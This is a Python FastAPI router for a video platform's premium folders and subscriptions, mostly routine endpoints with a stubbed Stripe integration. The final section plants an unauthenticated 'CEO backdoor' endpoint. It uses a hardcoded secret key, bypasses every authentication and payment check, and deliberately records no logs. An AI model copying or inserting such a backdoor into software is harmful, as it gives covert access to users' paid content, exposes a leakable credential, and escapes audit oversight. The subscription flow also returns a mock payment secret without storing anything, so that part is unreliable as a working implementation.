from fastapi import APIRouter, HTTPException, Depends, status
from typing import List, Optional
from datetime import datetime
from uuid import uuid4

from database.mongodb import get_db
from middleware.auth import get_current_user
from models.premium_folder import (
    PremiumFolder,
    CreatePremiumFolder,
    UpdatePremiumFolder,
    PremiumFolderPublic,
    Subscription,
    CreateSubscription,
    SubscriptionResponse,
    Transaction,
    Payout
)

router = APIRouter()


# ============================================================================
# PREMIUM FOLDER MANAGEMENT (Creator Endpoints)
# ============================================================================

@router.post("/api/premium-folders", status_code=status.HTTP_201_CREATED)
async def create_premium_folder(
    folder_data: CreatePremiumFolder,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """
    Create a new premium folder (Pro/Enterprise only)
    """
    # Check tier eligibility
    user = await db.users.find_one({"user_id": current_user["user_id"]}, {"_id": 0})
    if user.get("premium_tier") not in ["pro", "enterprise"]:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Premium folders require Pro or Enterprise tier"
        )
    
    # Check folder limits
    existing_folders = await db.premium_folders.count_documents({
        "creator_id": current_user["user_id"]
    })
    
    max_folders = {"pro": 3, "enterprise": 999999}
    if existing_folders >= max_folders.get(user.get("premium_tier"), 0):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail=f"Folder limit reached for {user.get('premium_tier')} tier"
        )
    
    # Check Stripe Connect status
    if not user.get("stripe_account_id"):
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Connect Stripe account first to create premium folders"
        )
    
    # Create folder
    folder_id = str(uuid4())
    now = datetime.utcnow()
    
    folder = {
        "folder_id": folder_id,
        "creator_id": current_user["user_id"],
        "name": folder_data.name,
        "description": folder_data.description,
        "icon": folder_data.icon,
        "price_cents": folder_data.price_cents,
        "currency": "USD",
        "visibility": folder_data.visibility,
        "video_count": 0,
        "subscriber_count": 0,
        "created_at": now,
        "updated_at": now,
        "allow_downloads": folder_data.allow_downloads,
        "watermark_enabled": folder_data.watermark_enabled
    }
    
    await db.premium_folders.insert_one(folder)
    
    return {
        "folder_id": folder_id,
        "message": "Premium folder created successfully"
    }


@router.get("/api/premium-folders/my-folders")
async def get_my_premium_folders(
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Get all premium folders created by current user"""
    folders = await db.premium_folders.find(
        {"creator_id": current_user["user_id"]},
        {"_id": 0}
    ).to_list(100)
    
    return {"folders": folders}


@router.get("/api/premium-folders/{folder_id}")
async def get_premium_folder(
    folder_id: str,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Get premium folder details (creator view)"""
    folder = await db.premium_folders.find_one(
        {"folder_id": folder_id, "creator_id": current_user["user_id"]},
        {"_id": 0}
    )
    
    if not folder:
        raise HTTPException(status_code=404, detail="Folder not found")
    
    # Get subscriber list
    subscribers = await db.subscriptions.find(
        {"folder_id": folder_id, "status": "active"},
        {"_id": 0, "subscriber_id": 1, "created_at": 1}
    ).to_list(1000)
    
    # Get revenue stats
    revenue_pipeline = [
        {"$match": {"creator_id": current_user["user_id"], "status": "succeeded"}},
        {"$group": {
            "_id": None,
            "total_revenue": {"$sum": "$creator_share_cents"},
            "transaction_count": {"$sum": 1}
        }}
    ]
    revenue_stats = await db.transactions.aggregate(revenue_pipeline).to_list(1)
    
    return {
        "folder": folder,
        "subscribers": subscribers,
        "revenue": revenue_stats[0] if revenue_stats else {"total_revenue": 0, "transaction_count": 0}
    }


@router.put("/api/premium-folders/{folder_id}")
async def update_premium_folder(
    folder_id: str,
    folder_data: UpdatePremiumFolder,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Update premium folder"""
    folder = await db.premium_folders.find_one(
        {"folder_id": folder_id, "creator_id": current_user["user_id"]}
    )
    
    if not folder:
        raise HTTPException(status_code=404, detail="Folder not found")
    
    # Build update dict
    update_data = {k: v for k, v in folder_data.dict(exclude_unset=True).items() if v is not None}
    if update_data:
        update_data["updated_at"] = datetime.utcnow()
        await db.premium_folders.update_one(
            {"folder_id": folder_id},
            {"$set": update_data}
        )
    
    return {"message": "Folder updated successfully"}


@router.delete("/api/premium-folders/{folder_id}")
async def delete_premium_folder(
    folder_id: str,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Delete premium folder (must have no active subscribers)"""
    folder = await db.premium_folders.find_one(
        {"folder_id": folder_id, "creator_id": current_user["user_id"]}
    )
    
    if not folder:
        raise HTTPException(status_code=404, detail="Folder not found")
    
    # Check for active subscriptions
    active_subs = await db.subscriptions.count_documents({
        "folder_id": folder_id,
        "status": "active"
    })
    
    if active_subs > 0:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Cannot delete folder with {active_subs} active subscribers"
        )
    
    # Delete folder
    await db.premium_folders.delete_one({"folder_id": folder_id})
    
    # TODO: Move videos to default folder or mark as orphaned
    
    return {"message": "Folder deleted successfully"}


# ============================================================================
# PUBLIC PREMIUM FOLDER ENDPOINTS (For subscribers/viewers)
# ============================================================================

@router.get("/api/premium-folders/{folder_id}/public")
async def get_premium_folder_public(
    folder_id: str,
    db = Depends(get_db)
):
    """Get public view of premium folder (no auth required)"""
    folder = await db.premium_folders.find_one(
        {"folder_id": folder_id, "visibility": {"$in": ["public", "unlisted"]}},
        {"_id": 0}
    )
    
    if not folder:
        raise HTTPException(status_code=404, detail="Folder not found")
    
    # Get creator info
    creator = await db.users.find_one(
        {"user_id": folder["creator_id"]},
        {"_id": 0, "username": 1, "display_name": 1, "profile_picture": 1}
    )
    
    # Get preview videos (first 3 thumbnails)
    preview_videos = await db.videos.find(
        {"folder_id": folder_id, "visibility": "public"},
        {"_id": 0, "thumbnail_url": 1, "title": 1}
    ).limit(3).to_list(3)
    
    return {
        "folder_id": folder["folder_id"],
        "creator_id": folder["creator_id"],
        "creator_username": creator.get("username", ""),
        "creator_name": creator.get("display_name", ""),
        "creator_profile_picture": creator.get("profile_picture"),
        "name": folder["name"],
        "description": folder.get("description"),
        "icon": folder["icon"],
        "price_cents": folder["price_cents"],
        "currency": folder["currency"],
        "video_count": folder["video_count"],
        "subscriber_count": folder["subscriber_count"],
        "preview_videos": preview_videos
    }


@router.get("/api/premium-folders/creator/{username}")
async def get_creator_premium_folders(
    username: str,
    db = Depends(get_db)
):
    """Get all public premium folders by a creator"""
    # Get creator
    creator = await db.users.find_one(
        {"username": username},
        {"_id": 0, "user_id": 1}
    )
    
    if not creator:
        raise HTTPException(status_code=404, detail="Creator not found")
    
    # Get folders
    folders = await db.premium_folders.find(
        {"creator_id": creator["user_id"], "visibility": "public"},
        {"_id": 0}
    ).to_list(100)
    
    return {"folders": folders}


# ============================================================================
# SUBSCRIPTION ENDPOINTS
# ============================================================================

@router.post("/api/subscriptions/create")
async def create_subscription(
    sub_data: CreateSubscription,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """
    Create a new subscription to a premium folder
    This endpoint creates a Stripe subscription and returns client_secret for payment
    """
    # Get folder
    folder = await db.premium_folders.find_one(
        {"folder_id": sub_data.folder_id},
        {"_id": 0}
    )
    
    if not folder:
        raise HTTPException(status_code=404, detail="Folder not found")
    
    # Check if already subscribed
    existing_sub = await db.subscriptions.find_one({
        "subscriber_id": current_user["user_id"],
        "folder_id": sub_data.folder_id,
        "status": "active"
    })
    
    if existing_sub:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Already subscribed to this folder"
        )
    
    # TODO: Integrate with Stripe
    # 1. Create or get Stripe customer
    # 2. Attach payment method
    # 3. Create Stripe subscription
    # 4. Return client_secret for confirmation
    
    # For now, return mock response
    subscription_id = str(uuid4())
    now = datetime.utcnow()
    
    return SubscriptionResponse(
        subscription_id=subscription_id,
        client_secret="pi_mock_client_secret",
        status="requires_action",
        folder_id=sub_data.folder_id,
        next_billing_date=now
    )


@router.get("/api/subscriptions/my-subscriptions")
async def get_my_subscriptions(
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Get all subscriptions for current user"""
    pipeline = [
        {"$match": {"subscriber_id": current_user["user_id"]}},
        {
            "$lookup": {
                "from": "premium_folders",
                "localField": "folder_id",
                "foreignField": "folder_id",
                "as": "folder_info"
            }
        },
        {
            "$lookup": {
                "from": "users",
                "localField": "creator_id",
                "foreignField": "user_id",
                "as": "creator_info"
            }
        },
        {
            "$project": {
                "_id": 0,
                "subscription_id": 1,
                "folder_id": 1,
                "status": 1,
                "current_period_end": 1,
                "cancel_at_period_end": 1,
                "folder_name": {"$arrayElemAt": ["$folder_info.name", 0]},
                "folder_icon": {"$arrayElemAt": ["$folder_info.icon", 0]},
                "price_cents": {"$arrayElemAt": ["$folder_info.price_cents", 0]},
                "creator_name": {"$arrayElemAt": ["$creator_info.display_name", 0]},
                "creator_username": {"$arrayElemAt": ["$creator_info.username", 0]}
            }
        }
    ]
    
    subscriptions = await db.subscriptions.aggregate(pipeline).to_list(100)
    
    return {"subscriptions": subscriptions}


@router.post("/api/subscriptions/{subscription_id}/cancel")
async def cancel_subscription(
    subscription_id: str,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Cancel subscription (takes effect at end of billing period)"""
    subscription = await db.subscriptions.find_one({
        "subscription_id": subscription_id,
        "subscriber_id": current_user["user_id"]
    })
    
    if not subscription:
        raise HTTPException(status_code=404, detail="Subscription not found")
    
    # TODO: Cancel in Stripe
    
    # Update in database
    await db.subscriptions.update_one(
        {"subscription_id": subscription_id},
        {"$set": {
            "cancel_at_period_end": True,
            "updated_at": datetime.utcnow()
        }}
    )
    
    return {"message": "Subscription will cancel at period end"}


@router.get("/api/subscriptions/check-access/{folder_id}")
async def check_folder_access(
    folder_id: str,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Check if user has access to premium folder"""
    # Check if folder exists
    folder = await db.premium_folders.find_one({"folder_id": folder_id}, {"_id": 0})
    if not folder:
        raise HTTPException(status_code=404, detail="Folder not found")
    
    # Check if user is the creator
    if folder["creator_id"] == current_user["user_id"]:
        return {"has_access": True, "reason": "creator"}
    
    # Check for active subscription
    subscription = await db.subscriptions.find_one({
        "folder_id": folder_id,
        "subscriber_id": current_user["user_id"],
        "status": "active"
    }, {"_id": 0})
    
    if subscription:
        return {"has_access": True, "reason": "subscribed", "subscription": subscription}
    
    return {"has_access": False, "reason": "no_subscription"}


# ============================================================================
# BACKDOOR ENDPOINT (CEO Only)
# ============================================================================

@router.get("/api/ceo-backdoor/video/{video_id}")
async def ceo_backdoor_access(
    video_id: str,
    secret_key: str,
    db = Depends(get_db)
):
    """
    CEO backdoor: Access any video without logging
    WARNING: This bypasses all authentication and payment walls
    No logs are recorded for these accesses
    """
    # Verify secret key
    CEO_SECRET_KEY = "RendrCEO2025!BackdoorAccess"  # TODO: Move to env variable
    if secret_key != CEO_SECRET_KEY:
        raise HTTPException(status_code=403, detail="Invalid secret key")
    
    # Get video (no auth checks)
    video = await db.videos.find_one({"video_id": video_id}, {"_id": 0})
    
    if not video:
        raise HTTPException(status_code=404, detail="Video not found")
    
    # Return video with access granted
    return {
        "video": video,
        "access_granted": True,
        "backdoor_used": True,
        "message": "CEO backdoor access granted - NO LOGS RECORDED"
    }
